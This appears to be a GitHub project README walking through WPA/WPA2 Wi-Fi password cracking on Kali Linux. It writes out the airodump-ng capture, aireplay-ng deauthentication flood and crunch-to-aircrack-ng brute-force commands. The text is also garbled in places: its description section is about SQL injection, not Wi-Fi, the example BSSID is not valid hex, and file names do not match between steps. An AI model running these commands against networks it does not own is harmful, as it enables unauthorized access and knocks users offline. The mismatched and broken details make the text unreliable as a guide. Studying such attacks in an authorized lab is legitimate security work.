<h1>Wpa/Wpa2 Wifi Hacking </h1>

<h2>Description</h2>
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.
<br />


<h2>Tools Required </h2>

- <b>Network Adapter (e.g., TL-WN722N V2) with monitoring mode support.</b> 
- <b>Aircrack-ng</b>
- <b>Airodump-ng</b>
- <b>Airmon-ng</b>
-<b>Crunch</b>
<h2>Environments Used </h2>

- <b>Kali Linux</b> (21H2)

<h2>Program walk-through:</h2>
<p>Monitoring Mode Setup
Step 1: Kill Interrupting Services
Before enabling monitoring mode, identify and kill services that might interrupt the process</p>

![image](https://github.com/MohebAwichewi/Projects/assets/149394585/dd5fc52d-7e17-412f-b610-e02d669956bc)

<p>Step 2: Enable Monitoring Mode
Stop the WLAN interface and enable monitor mode:</p>

![image](https://github.com/MohebAwichewi/Projects/assets/149394585/7ff8fc4e-1bd6-484f-baba-3be7437ca605)

<p>Verify the mode using: iwconfig</p>

![image](https://github.com/MohebAwichewi/Projects/assets/149394585/0e78f00c-9da3-4f45-ac0f-56f92ed9fa40)

<p>Packet Capture and 4-way Handshake
Step 3: Capture BSSID and Monitor Network
Use airodump-ng to capture BSSID information:airodump-ng wlan0 </p>

![image](https://github.com/MohebAwichewi/Projects/assets/149394585/2c8bdbe7-b257-4127-addb-aeabb3c25a81)
<p>Select a specific BSSID for monitoring and run:airodump-ng -c 1 -w Scan_network --bssid EW:WV:4H:J7:A5:28 wlan0 </p>

![image](https://github.com/MohebAwichewi/Projects/assets/149394585/ae365eef-823b-4f01-ad7b-71ac6513efe7)
<p>Step 4: Deauthentication Process
Deauthenticate the target Wi-Fi to capture the 4-way handshake:
sudo aireplay-ng -0 0 -a EW:WV:4H:J7:A5:28 wlan0</p>

![image](https://github.com/MohebAwichewi/Projects/assets/149394585/3e0ada97-b5ca-4cd2-bae2-ea4d86d6cdb9)
<p>Run the command until you see the 4-way handshake in the background code.</p>

<p>Final Stage: Password Cracking with Crunch and Aircrack-ng
After capturing the 4-way handshake, the final step involves cracking the Wi-Fi password using Crunch and aircrack-ng. It's important to note that the success of this process heavily depends on various factors, including the complexity and length of the password.
Using Crunch for Password Generation
In this example, I used Crunch to generate possible passwords. Since I knew the Wi-Fi password consisted of only numeric characters, the command was tailored accordingly:
sudo crunch 8 8 123456780 | aircrack-ng -w - Scan_Kamalesh-01.cap -e KamaleshD</p>

![image](https://github.com/MohebAwichewi/Projects/assets/149394585/196a444e-22da-4718-801a-7b98a2db694b)
